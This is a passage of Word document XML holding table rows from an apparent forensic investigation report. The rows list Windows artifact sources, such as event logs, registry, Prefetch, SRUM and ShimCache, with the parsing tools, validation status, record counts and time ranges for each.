          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>261790</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.416985</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:33:10.222282</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (indexed files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>88927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1983-08-07 09:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:24.066015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>88108</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1983-08-07 09:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:17.862700</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$LogFile (reconstructed USN)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>39210</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:08:40.119081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:33:38.019166</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>28339</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:32:16.919600</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>7163</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:53:37.662461</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:32:51.769147</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application timeline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:03:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>884</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:51:55.959153</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:16:01.197200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (drivers)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>734</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:43:33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:26:10.816544</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>669</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:22:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Services (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>638</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:51:55.959152</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:13:55.853390</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:54.416936</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:24.097276</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MUICache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>310</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:46.657461</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:29:45.909084</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: TaskCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>287</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-10-18 18:58:22.542424</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:18:57.619018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>276</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:10:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:33:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>261</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:10:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:33:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
